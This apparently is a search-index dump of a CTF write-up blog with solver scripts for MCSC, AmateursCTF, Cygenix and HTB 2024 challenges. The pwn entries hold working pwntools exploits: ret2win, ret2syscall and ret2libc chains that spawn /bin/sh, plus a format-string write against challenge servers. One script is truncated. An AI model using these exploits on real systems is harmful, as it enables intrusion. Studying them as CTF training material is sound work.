[{"categories":["Writeups"],"content":"Writeup for Q4N1 challenge.","date":"2024-08-13","objectID":"/circuits/","tags":["Misc","MCSC","Q4N1"],"title":"MCSC 2024 - Q4N1","uri":"/circuits/"},{"categories":["Writeups"],"content":"Writeup for Quantum challenge from MCSC 2024. from qiskit import QuantumCircuit, execute, Aer # Create a quantum circuit with 7 qubits and 7 classical bits circuit = QuantumCircuit(7, 7) # Apply the gates from your OPENQASM code circuit.cz(2, 4) circuit.z(2) circuit.cy(2, 4) # ... (add the remaining gates) # Measure all qubits circuit.measure(range(7), range(7)) # Choose a backend (simulator or real quantum computer) simulator = Aer.get_backend('qasm_simulator') # Execute the circuit and get the counts job = execute(circuit, backend=simulator, shots=1024) # Increase shots for better statistics counts = job.result().get_counts() # Print the measurement results print(counts) ","date":"2024-08-13","objectID":"/circuits/:0:0","tags":["Misc","MCSC","Q4N1"],"title":"MCSC 2024 - Q4N1","uri":"/circuits/"},{"categories":["Writeups"],"content":"Explanation You create a quantum circuit with 7 qubits and 7 classical bits, where quantum operations are performed on the qubits, and the classical bits store the measurement results. Several quantum gates are applied, including a controlled-Z gate (cz) where qubit 2 controls qubit 4, a Z gate that flips the phase of qubit 2, and a controlled-Y gate (cy) with qubit 2 as the control and qubit 4 as the target. After adding the necessary gates, all 7 qubits are measured, with the results stored in the corresponding classical bits. The circuit is then simulated using the qasm_simulator backend, which mimics a real quantum computer. The circuit is executed 1024 times to gather statistical outcomes, and the measurement results are retrieved and displayed as a dictionary, showing the frequency of each possible outcome in binary form. ","date":"2024-08-13","objectID":"/circuits/:1:0","tags":["Misc","MCSC","Q4N1"],"title":"MCSC 2024 - Q4N1","uri":"/circuits/"},{"categories":["Writeups"],"content":"Writeup for zipbomb challenge.","date":"2024-08-13","objectID":"/zipbomb/","tags":["Misc","MCSC","Zipbomb"],"title":"MCSC 2024 - Zipbomb","uri":"/zipbomb/"},{"categories":["Writeups"],"content":"Writeup for Zipbomb challenge from MCSC 2024. import base64 import string import gzip import binascii import io import py7zr import os import re brail=\"⠴⠂⠆⠒⠲⠢⠖⠶⠦⠔⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠮⠐⠼⠫⠩⠯⠄⠷⠾⠡⠬⠠⠤⠨⠌⠱⠰⠣⠿⠜⠹⠈⠪⠳⠻⠘⠸\" strings = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\\"#$%\u0026'()*+,-./:;\u003c=\u003e?@[\\\\]^_\" def contains_braille(text): brail = \"⠴⠂⠆⠒⠲⠢⠖⠶⠦⠔⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠮⠐⠼⠫⠩⠯⠄⠷⠾⠡⠬⠠⠤⠨⠌⠱⠰⠣⠿⠜⠹⠈⠪⠳⠻⠘⠸\" for char in text: if char in brail: return True return False def contains_hexadecimal(text): return all(c in string.hexdigits for c in text) def contains_non_printables(text): # Iterate over each character in the text for char in text: # Check if the character is non-printable or matches specific value like 'ÿ' if not char.isprintable(): return True # If no non-printable characters are found, return False return False def convertbraille(text): result = \"\" for char in text: result += strings[brail.index(char)] return result def hex_to_string(hex_str): try: # Convert hexadecimal string to bytes hex_bytes = bytes.fromhex(hex_str) # Convert bytes to string return hex_bytes.decode('ascii') except Exception as e: print(\"Error:\", e) return None def gunzip_bytes_obj(text): text = text.encode('latin1') text = gzip.GzipFile(fileobj=io.BytesIO(text), mode='rb') text = text.read().decode('utf-8') return text def is_base32(s): # Define the Base32 alphabet s=s.upper() print(s) base32_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567' # Check if all characters in the string are part of the Base32 alphabet for char in s: if char not in base32_alphabet: if char==\"=\": return True return False return True def extract_7z_with_password(archive_path, output_dir, password): try: # Open the 7z archive with the provided password with py7zr.SevenZipFile(archive_path, mode='r', password=password) as z: # Extract all files to the specified output directory z.extractall(path=output_dir) print(f\"Extraction of {archive_path} successful!\") os.chdir(output_dir) except Exception as e: print(f\"Extraction of {archive_path} failed:\", e) def extract_from_directory(directory, output_dir, password): # Iterate through files in the directory for filename in os.listdir(directory): if filename.endswith(\".7z\"): # Check if the file ends with \".7z\" # Construct the full path to the 7z archive archive_path = os.path.join(directory, filename) # Attempt to extract the 7z archive extract_7z_with_password(archive_path, output_dir, password) #while True: i=1 while True: with open('crack_me', 'r',encoding='utf-8') as file: # Read the entire contents of the file text = file.read() with open('backup_me', 'x',encoding='utf-8') as file: file.write(text) # Now 'text' contains the contents of the file while (type(text) == str): if contains_braille(text): text=convertbraille(text) elif contains_non_printables(text): text=gunzip_bytes_obj(text) elif contains_hexadecimal(text): text = ''.join([chr(int(text[i:i+2], 16)) for i in range(0, len(text), 2)]) else : text=text.upper() text = base64.b32decode(text).decode('utf-8') print(text,end=\"\\n\\n\") if len(text) \u003c= len(\"SKOWJUHYISBWNOQMZUOQOZXZPOTVAW\") : if contains_braille(text)==False: break text=text.upper() extract_from_directory('.', './'+str(i), text) i+=1 ","date":"2024-08-13","objectID":"/zipbomb/:0:0","tags":["Misc","MCSC","Zipbomb"],"title":"MCSC 2024 - Zipbomb","uri":"/zipbomb/"},{"categories":["Writeups"],"content":"Explanation It’s a simple automation of the decoding steps The logic goes : detect if it’s braille hex or gunzipped, decode it, cd to the new directory,rinse and repeat. ","date":"2024-08-13","objectID":"/zipbomb/:1:0","tags":["Misc","MCSC","Zipbomb"],"title":"MCSC 2024 - Zipbomb","uri":"/zipbomb/"},{"categories":["Writeups"],"content":"AmateursCTF 2024 - Less suspicious RSA","date":"2024-08-27","objectID":"/less-suspicious-rsa/","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Less suspicious RSA","uri":"/less-suspicious-rsa/"},{"categories":["Writeups"],"content":"I need help factoring this modulus, it looks less suspicious, but I can’t factor using any conventional methods. from math import sqrt from decimal import * from Crypto.Util.number import * import gmpy2 from gmpy2 import mpz, is_prime getcontext().prec = 100 # Change the precision def factorial(n): if n == 0: return 1 return factorial(n-1) * n def nextPrime(p, n): p += (n - p) % n p += 1 iters = 0 while not isPrime(p): p += n return p n = 138963980427736364646203557164328211078134463518489686365728312873583832517087170768576679472472907142081360480944201759920246566585465801088226164314480607014663211599932950864391702460227584467326051919881067028851940610382044445003060103566003934601979805899293539507221062915314813557293919231917284247667 iter =0 p = int(sqrt(n)) while (not isPrime(p)): p += 1 iter += 1 #print(iter) q = n//p print(q) print(p) n = p*q print(n) ","date":"2024-08-27","objectID":"/less-suspicious-rsa/:0:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Less suspicious RSA","uri":"/less-suspicious-rsa/"},{"categories":["Writeups"],"content":"Explanation Computes square root of n -\u003e finds the nearest prime p greater than or equal to the square root -\u003e calculates q as n divided by p -\u003e verifies by recomputing n as p * q. ","date":"2024-08-27","objectID":"/less-suspicious-rsa/:1:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Less suspicious RSA","uri":"/less-suspicious-rsa/"},{"categories":["Writeups"],"content":"AmateursCTF 2024 - Typo","date":"2024-08-27","objectID":"/typo/","tags":["REVERSE","AmateursCTF",2024],"title":"AmateursCTF 2024 - Typo","uri":"/typo/"},{"categories":["Writeups"],"content":"can you make sure i didn’t make a typo? import random as ran intVar = int('1665663c', 20) ran.seed(intVar) padding = '\\r'r'\\r''r''\\\\r'r'\\\\r\\r'r'r''r''\\\\r'r'r\\r'r'r\\\\r''r'r'r''r''\\\\r'r'\\\\r\\r'r'r''r''\\\\r'r'rr\\r''\\r''r''r\\\\'r'\\r''\\r''r\\\\\\r'r'r\\r''\\rr' pay = [ b'arRRrrRRrRRrRRrRr', b'aRrRrrRRrRr', b'arRRrrRRrRRrRr', b'arRRrRrRRrRr', b'arRRrRRrRrrRRrRR' b'arRRrrRRrRRRrRRrRr', b'arRRrrRRrRRRrRr', b'arRRrrRRrRRRrRr' b'arRrRrRrRRRrrRrrrR', ] def lamfunc(y): return bytearray([x - 1 for x in y]) def res(y): return bytearray([x + 1 for x in y]) def handle(hex): for list in range(1, len(hex) - 1, 2): hex[list], hex[list + 1] = hex[list + 1], hex[list] for id in range(0, len(hex) - 1, 2): hex[id], hex[id + 1] = hex[id + 1], hex[id] return hex randres = [handle, lamfunc, res] randres = [ran.choice(randres) for x in range(128)] def reverse(ar_int): chars = \"0123456789abcdefg\" hex_str = '' while ar_int \u003e 0: remainder = ar_int % 17 hex_str = chars[remainder] + hex_str ar_int = ar_int // 17 bytes_ar = bytearray.fromhex(hex_str) return bytes_ar def handle(arr, ar): ar = int(ar, 16) for r in arr[::-1]: ar -= int(r, 35) return reverse(ar) def ran(arr, ar): for r in ar[::-1]: arr = randres[r](arr) return arr re = '5915f8ba06db0a50aa2f3eee4baef82e70be1a9ac80cb59e5b9cb15a15a7f7246604a5e456ad5324167411480f893f97e3' flag = handle(pay,re) randomfunc = ran(flag, padding.encode()) print(randomfunc.decode()) ","date":"2024-08-27","objectID":"/typo/:0:0","tags":["REVERSE","AmateursCTF",2024],"title":"AmateursCTF 2024 - Typo","uri":"/typo/"},{"categories":["Writeups"],"content":"Explanation Converts a hexadecimal string to integer -\u003e applies a series of random operations on a byte array based on random choices -\u003e transforms the result back to a byte array and decodes it to a string. ","date":"2024-08-27","objectID":"/typo/:1:0","tags":["REVERSE","AmateursCTF",2024],"title":"AmateursCTF 2024 - Typo","uri":"/typo/"},{"categories":["Writeups"],"content":"AmateursCTF 2024 - Unsuspicious RSA","date":"2024-08-27","objectID":"/unsuspicious-rsa/","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Unsuspicious RSA","uri":"/unsuspicious-rsa/"},{"categories":["Writeups"],"content":"I need help factoring this modulus, it looks suspicious, but I can’t factor using any conventional methods. from math import sqrt from decimal import * from Crypto.Util.number import * import gmpy2 from gmpy2 import mpz, is_prime getcontext().prec = 100 # Change the precision def factorial(n): if n == 0: return 1 return factorial(n-1) * n def nextPrime(p, n): p += (n - p) % n p += 1 iters = 0 while not isPrime(p): p += n return p n = 172391551927761576067659307357620721422739678820495774305873584621252712399496576196263035396006999836369799931266873378023097609967946749267124740589901094349829053978388042817025552765214268699484300142561454883219890142913389461801693414623922253012031301348707811702687094437054617108593289186399175149061 iter =0 p = int(sqrt(n)) while (not isPrime(p)): p += 1 iter += 1 print(iter) q = nextPrime(p, factorial(90)) print(q) p = n//q print(p) t = nextPrime(p, factorial(90)) print(t==q) print(p*q == n) ","date":"2024-08-27","objectID":"/unsuspicious-rsa/:0:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Unsuspicious RSA","uri":"/unsuspicious-rsa/"},{"categories":["Writeups"],"content":"Explanation Finds prime factors of a large number n using high-precision arithmetic -\u003e initializes p as the square root of n and finds the nearest prime -\u003e finds the next prime q with a step size of 90 factorial -\u003e calculates p and verifies p * q equals n -\u003e checks if the next prime after p equals q. ","date":"2024-08-27","objectID":"/unsuspicious-rsa/:1:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Unsuspicious RSA","uri":"/unsuspicious-rsa/"},{"categories":["Writeups"],"content":"Cygenix CTF 2024 - Classic","date":"2024-08-27","objectID":"/classic/","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Classic","uri":"/classic/"},{"categories":["Writeups"],"content":"Every vulnerability is a door, and some doors lead to treasures. #setup pwntools from pwn import * context(arch='amd64', os='linux') #context.log_level = 'debug' #context.terminal = ['tmux', 'splitw', '-h'] #setup binary exe = ELF('./main') p = process(exe.path) #nc chall.ycfteam.in 3333 #p = remote('chall.ycfteam.in', 3333) #p = gdb.debug(exe.path) # Calculate the offset to the return address offset = 40 # 32 bytes for the buffer + 8 bytes for saved RBP # Find the address of the win function (replace with the correct function) win_addr = exe.symbols['win'] # Assuming there's a win function # Print the win function address print(\"win function address: \" + hex(win_addr)) # get the ret address ret_addr = 0x40116C context.log_level = 'debug' # Craft the payload payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, # Overwrite return address with win() function address win_addr # Overwrite return address with win() function address ) # Print the payload print(payload) # Send the payload p.sendline(payload) # Interact with the program p.interactive() ","date":"2024-08-27","objectID":"/classic/:0:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Classic","uri":"/classic/"},{"categories":["Writeups"],"content":"Explanation Simple ret2win, buffer overflow -\u003e ret -\u003e win -\u003e remote shell ","date":"2024-08-27","objectID":"/classic/:1:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Classic","uri":"/classic/"},{"categories":["Writeups"],"content":"Cygenix CTF 2024 - Classic","date":"2024-08-27","objectID":"/gadgets/","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Gadgets","uri":"/gadgets/"},{"categories":["Writeups"],"content":"Even the strongest defenses have cracks; find them. #setup pwntools from pwn import * context(arch='amd64', os='linux') #context.log_level = 'debug' #context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' #setup binary exe = ELF('./main') p = process(exe.path) #nc chall.ycfteam.in 3333 #p = remote('chall.ycfteam.in', 3333) #p = gdb.debug(exe.path) # Calculate the offset to the return address offset = 40 # 32 bytes for the buffer + 8 bytes for saved RBP # get the ret address using ropgadget rop = ROP(exe) # pop rdi pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] # Print the pop rdi gadget log.info(f\"pop rdi gadget: {hex(pop_rdi)}\") # pop rsi pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] # Print the pop rsi gadget log.info(f\"pop rsi gadget: {hex(pop_rsi)}\") # pop rdx pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0] # Print the pop rdx gadget log.info(f\"pop rdx gadget: {hex(pop_rdx)}\") # pop rax pop_rax = rop.find_gadget(['pop rax', 'ret'])[0] # Print the pop rax gadget log.info(f\"pop rax gadget: {hex(pop_rax)}\") # search for bin/sh bin_sh = next(exe.search(b\"/bin/sh\\x00\")) # get syscall address from win function syscall = 0x401159 # Craft the payload payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP pop_rax, 0x3b, pop_rdi, bin_sh, pop_rsi, 0, pop_rdx, 0, syscall ) # Print the payload print(payload) # Send the payload p.sendline(payload) # Interact with the program p.interactive() ","date":"2024-08-27","objectID":"/gadgets/:0:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Gadgets","uri":"/gadgets/"},{"categories":["Writeups"],"content":"Explanation Simple ret2syscall, buffer overflow -\u003e control registers (RAX, RDI, RSI, RDX) -\u003e execute syscall -\u003e spawn /bin/sh shell ","date":"2024-08-27","objectID":"/gadgets/:1:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Gadgets","uri":"/gadgets/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Colored Squares","date":"2024-08-27","objectID":"/colored-squares/","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Colored Squares","uri":"/colored-squares/"},{"categories":["Writeups"],"content":"In the heart of an ancient forest stands a coloured towering tree, its branches adorned with countless doors. Each door, when opened, reveals a labyrinth of branching paths, leading to more doors beyond. As you venture deeper into the maze, the forest seems to come alive with whispered secrets and shifting shadows. With each door opened, the maze expands, presenting new choices and challenges at every turn. Can you understand what’s going on and get out of this maze? from z3 import * flag = BitVecs('v0 v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20 v21', 8) s = Solver() for i in range(len(flag)): s.add(flag[i] \u003e= 48) s.add(flag[i] \u003c= 125) s.add(flag[0] == ord('H')) s.add(flag[1] == ord('T')) s.add(flag[2] == ord('B')) s.add(flag[3] == ord('{')) s.add(flag[21] == ord('}')) # Additional constraints s.add(flag[7] - flag[18] == flag[8] - flag[9]) s.add(flag[6] + flag[10] == flag[16] + flag[20] + 12) s.add(flag[8] * flag[14] == 2 * flag[18] * flag[13]) s.add(flag[19] == flag[6]) s.add(flag[9] + 1 == flag[17] - 1) s.add(flag[11] == 2 * (flag[5] + 7)) s.add(flag[5] + flag[2]/2 == flag[1]) s.add(flag[16] - 9 == flag[13] + 4) s.add(flag[12] == 17 * 3) s.add(flag[4] - flag[5] + flag[12] == flag[14] + 20) s.add(flag[12] * flag[15] == 24 * flag[14]) s.add(flag[18] + flag[4] == 173) s.add(flag[6] == flag[5] + 63) s.add(flag[16] * 32 == flag[0] * flag[7]) s.add(flag[17] - flag[15] == flag[18] + 1) s.add(flag[20] == ord('s')) if s.check() == sat: m = s.model() result = ''.join([chr(m.evaluate(flag[i]).as_long()) for i in range(len(flag))]) print(\"Flag:\", result) else: print(\"No solution found.\") ","date":"2024-08-27","objectID":"/colored-squares/:0:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Colored Squares","uri":"/colored-squares/"},{"categories":["Writeups"],"content":"Explanation Solves for a 22-character flag using Z3 solver -\u003e imposes constraints on flag characters -\u003e finds valid flag satisfying all conditions. ","date":"2024-08-27","objectID":"/colored-squares/:1:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Colored Squares","uri":"/colored-squares/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Delulu","date":"2024-08-27","objectID":"/delulu/","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Delulu","uri":"/delulu/"},{"categories":["Writeups"],"content":"Delulu is a very easy difficulty challenge that features format string vulnerability, overwriting a variable’s value. from pwn import * #nc 83.136.251.235 53824 # Start the process p = process('./delulu') #nc 94.237.49.116 55529 #p = remote('94.237.51.233',44897) gdb.attach(p, gdbscript=\"b *main+134\\n continue\") print(p.recv().decode()) pay = b'\\xf8\\xdd\\xff\\xff\\xff\\x7f' #pay += b'\\xf8\\xdd\\xff\\xff\\xff\\x7f' pay += b'%7$n' #pay += b'%48867x%7$hn%48879x%8$hn' # Send the payload without a newline p.send(pay) print(p.recvall()) ","date":"2024-08-27","objectID":"/delulu/:0:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Delulu","uri":"/delulu/"},{"categories":["Writeups"],"content":"Explanation Starts a local process of delulu binary for exploitation -\u003e attaches gdb for debugging and sets a breakpoint -\u003e creates a format string payload to write data to a specified address -\u003e sends the payload to the process and prints the output. ","date":"2024-08-27","objectID":"/delulu/:1:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Delulu","uri":"/delulu/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Metagaming","date":"2024-08-27","objectID":"/metagaming/","tags":["REVERSE","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Metagaming","uri":"/metagaming/"},{"categories":["Writeups"],"content":"You come across an enemy faction, who have banded together and gathered their resources. You’ll need to outwit them, thinking outside the box- can you beat them before they even begin to run? from z3 import * payload = [ [12,13,10], [21,0,0], [0,13,13], [0,14,0], [15,11,12], [24,14,0], [5,0,14], [0,14,1], [7,11,11], [24,14,8], [5,0,14], [0,14,2], [2,10,11], [24,14,16], [18,12,11], [5,0,14], [0,14,3], [0,11,11], [24,14,24], [13,10,10], [5,0,14], [2,11,13], [21,1,0], [0,14,4], [24,14,0], [5,1,14], [6,11,12], [0,14,5], [8,10,10], [24,14,8], [11,12,11], [5,1,14], [0,14,6], [0,12,10], [24,14,16], [9,10,13], [5,1,14], [0,14,7], [13,12,12], [24,14,24], [15,10,12], [5,1,14], [21,2,0], [20,13,13], [0,14,8], [24,14,0], [19,10,11], [5,2,14], [6,12,10], [0,14,9], [8,11,11], [24,14,8], [5,2,14], [0,14,10], [4,11,12], [24,14,16], [5,2,14], [0,14,11], [24,14,24], [4,13,12], [5,2,14], [21,3,0], [14,10,12], [0,14,12], [13,10,11], [24,14,0], [16,10,10], [5,3,14], [5,11,12], [0,14,13], [12,10,13], [24,14,8], [2,10,13], [5,3,14], [20,11,11], [0,14,14], [24,14,16], [18,13,11], [5,3,14], [6,11,13], [0,14,15], [24,14,24], [4,11,10], [5,3,14], [21,4,0], [15,13,11], [0,14,16], [6,10,10], [24,14,0], [14,10,12], [5,4,14], [0,14,17], [12,13,13], [24,14,8], [19,11,10], [5,4,14], [0,14,18], [17,13,12], [24,14,16], [5,4,14], [0,14,19], [24,14,24], [21,12,10], [5,4,14], [13,13,10], [21,5,0], [0,14,20], [19,10,13], [24,14,0], [5,5,14], [0,14,21], [24,14,8], [8,13,13], [5,5,14], [0,14,22], [16,13,11], [24,14,16], [10,10,13], [5,5,14], [7,10,12], [0,14,23], [19,13,10], [24,14,24], [5,5,14], [17,12,10], [21,6,0], [16,11,10], [0,14,24], [24,14,0], [10,11,10], [5,6,14], [0,14,25], [24,14,8], [7,10,12], [5,6,14], [0,14,26], [16,12,11], [24,14,16], [3,11,10], [5,6,14], [15,11,13], [0,14,27], [4,12,13], [24,14,24], [5,6,14], [14,11,13], [21,7,0], [0,14,28], [21,13,11], [24,14,0], [7,12,11], [5,7,14], [17,11,10], [0,14,29], [24,14,8], [5,7,14], [0,14,30], [12,10,10], [24,14,16], [5,7,14], [0,14,31], [20,10,10], [24,14,24], [5,7,14], [21,8,0], [18,10,12], [0,14,32], [9,11,11], [24,14,0], [21,12,11], [5,8,14], [0,14,33], [24,14,8], [19,10,13], [5,8,14], [8,12,13], [0,14,34], [24,14,16], [5,8,14], [8,10,10], [0,14,35], [24,14,24], [21,13,10], [5,8,14], [0,12,10], [21,9,0], [0,14,36], [24,14,0], [5,9,14], [17,11,11], [0,14,37], [14,10,13], [24,14,8], [5,9,14], [4,10,11], [0,14,38], [13,11,13], [24,14,16], [5,9,14], [0,14,39], [10,11,10], [24,14,24], [20,13,13], [5,9,14], [6,12,11], [21,14,0], [8,0,2769503260], [10,0,997841014], [19,12,11], [2,0,4065997671], [5,13,11], [8,0,690011675], [15,11,11], [8,0,540576667], [2,0,1618285201], [8,0,1123989331], [8,0,1914950564], [8,0,4213669998], [21,13,11], [8,0,1529621790], [10,0,865446746], [2,10,11], [8,0,449019059], [16,13,11], [8,0,906976959], [6,10,10], [8,0,892028723], [10,0,1040131328], [2,0,3854135066], [2,0,4133925041], [2,0,1738396966], [2,12,12], [8,0,550277338], [10,0,1043160697], [2,1,1176768057], [10,1,2368952475], [8,12,11], [2,1,2826144967], [8,1,1275301297], [10,1,2955899422], [2,1,2241699318], [12,11,10], [8,1,537794314], [11,13,10], [8,1,473021534], [17,12,13], [8,1,2381227371], [10,1,3973380876], [10,1,1728990628], [6,11,13], [8,1,2974252696], [0,11,11], [8,1,1912236055], [2,1,3620744853], [3,10,13], [2,1,2628426447], [11,13,12], [10,1,486914414], [16,11,12], [10,1,1187047173], [14,12,11], [2,2,3103274804], [13,10,10], [8,2,3320200805], [8,2,3846589389], [1,13,13], [2,2,2724573159], [10,2,1483327425], [2,2,1957985324], [14,13,12], [10,2,1467602691], [8,2,3142557962], [2,13,12], [2,2,2525769395], [8,2,3681119483], [8,12,11], [10,2,1041439413], [10,2,1042206298], [2,2,527001246], [20,10,13], [10,2,855860613], [8,10,10], [8,2,1865979270], [1,13,10], [8,2,2752636085], [2,2,1389650363], [10,2,2721642985], [18,10,11], [8,2,3276518041], [15,10,10], [2,2,1965130376], [2,3,3557111558], [2,3,3031574352], [16,12,10], [10,3,4226755821], [8,3,2624879637], [8,3,1381275708], [2,3,3310620882], [2,3,2475591380], [8,3,405408383], ","date":"2024-08-27","objectID":"/metagaming/:0:0","tags":["REVERSE","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Metagaming","uri":"/metagaming/"},{"categories":["Writeups"],"content":"Explanation Solves for a 40-character flag using Z3 solver -\u003e imposes constraints on flag characters and register values -\u003e executes instructions to transform registers -\u003e ensures final register values match specified values -\u003e finds valid flag satisfying all conditions. ","date":"2024-08-27","objectID":"/metagaming/:1:0","tags":["REVERSE","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Metagaming","uri":"/metagaming/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - QuickScan","date":"2024-08-27","objectID":"/quickscan/","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - QuickScan","uri":"/quickscan/"},{"categories":["Writeups"],"content":"QuickScan is a Medium reversing challenge. Players will be sent a series of small, randomly generated ELF files and must rapidly and automatically anlalyse them in order to extract required data. from pwn import * #94.237.62.48 32757 p = remote('94.237.62.48',32757) m = (p.recv()) print(m.decode()) def find_substring_index(string, substring): index = string.find(substring) + len(substring) return index while True: start_index = m.find(b\"ELF: \") + len(b\"ELF: \") end_index = m.find(b\"\\n\", start_index) elf_data_base64 = m[start_index:end_index] # Decode base64-encoded ELF data elf_data = base64.b64decode(elf_data_base64) hexxer = elf_data.hex() substring = \"488d35\" index = find_substring_index(hexxer, substring) padding = int.from_bytes(bytes.fromhex(hexxer[index:index+8]), byteorder='little', signed=True)*2 start = index+8 end = start+padding r = hexxer[end:end+48] print(hexxer) p.sendline(r) m = p.recv() print(m.decode()) ","date":"2024-08-27","objectID":"/quickscan/:0:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - QuickScan","uri":"/quickscan/"},{"categories":["Writeups"],"content":"Explanation Decodes ELF binary from Base64 -\u003e converts to hex -\u003e finds substring index for opcode I forgot about -\u003e calculates padding -\u003e extracts and prints portion of hex data based on padding. ","date":"2024-08-27","objectID":"/quickscan/:1:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - QuickScan","uri":"/quickscan/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","date":"2024-08-27","objectID":"/writing-on-the-wall/","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","uri":"/writing-on-the-wall/"},{"categories":["Writeups"],"content":"As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door’s secrets? from pwn import * #nc 83.136.251.235 53824 # Start the process #p = process('./writing_on_the_wall') p = remote('83.136.251.235',53824) #gdb.attach(p, gdbscript=\"b *main+77\\n continue\") print(p.recv().decode()) # Send the payload without a newline p.send(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00') print(p.recvall().decode()) ","date":"2024-08-27","objectID":"/writing-on-the-wall/:0:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","uri":"/writing-on-the-wall/"},{"categories":["Writeups"],"content":"Explanation 9 null bytes to manipulate the data ","date":"2024-08-27","objectID":"/writing-on-the-wall/:1:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","uri":"/writing-on-the-wall/"},{"categories":["Writeups"],"content":"CygenixCTF - Chain it","date":"2024-08-26","objectID":"/chainit/","tags":["PWN","CygenixCTF"],"title":"CygenixCTF - Chain it","uri":"/chainit/"},{"categories":["Writeups"],"content":"Where there is code, there is a way in. #setup pwntools from pwn import * context(arch='amd64', os='linux') #setup binary exe = ELF('./main') p = process(exe.path) context.log_level = \"critical\" #nc 134.209.150.149 4444 p = remote(\"134.209.150.149\", 4444) # Calculate the offset to the return address offset = 40 # 32 bytes for the buffer + 8 bytes for saved RBP # Find the address of the win function (replace with the correct function) id_addr = exe.symbols['id'] # Assuming there's a win function # Print the win function address print(\"id function address: \" + hex(id_addr)) # Addresses ret_addr = 0x0000000000401016 pop_rdi = 0x000000000040115a #GOT puts_got = exe.got['puts'] #PLT puts_plt = exe.plt['puts'] #main main = exe.symbols['main'] #payload to leak puts payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, pop_rdi, # Overwrite return address with win() function address puts_got, # Overwrite return address with win() function address puts_plt, main ) # Send the payload p.sendline(payload) p.recvline() p.recvline() p.recvline() puts_leak = u64(p.recvline().strip().ljust(8, b\"\\x00\")) print(f\"puts@GLIBC: {hex(puts_leak)}\") #leak gets payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, pop_rdi, # Overwrite return address with win() function address exe.got['gets'], # Overwrite return address with win() function address puts_plt, main ) # Send the payload p.sendline(payload) p.recvline() p.recvline() p.recvline() gets_leak = u64(p.recvline().strip().ljust(8, b\"\\x00\")) print(f\"gets@GLIBC: {hex(gets_leak)}\") #download libc libc_filename = libcdb.search_by_symbol_offsets({'puts': puts_leak, 'gets': gets_leak}, select_index=1) libc = ELF(libc_filename) libc.address = puts_leak - libc.sym['puts'] #system system = libc.sym['system'] bin_sh = next(libc.search(b'/bin/sh\\x00')) # Final exploit payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, pop_rdi, # Overwrite return address with win() function address bin_sh, # Overwrite return address with win() function address system, ) p.sendline(payload) p.interactive() ","date":"2024-08-26","objectID":"/chainit/:0:0","tags":["PWN","CygenixCTF"],"title":"CygenixCTF - Chain it","uri":"/chainit/"},{"categories":["Writeups"],"content":"Explanation Leak puts and gets using buffer overflow + pop rdi and ret -\u003e getting the right libc with this new info -\u003e remote shell 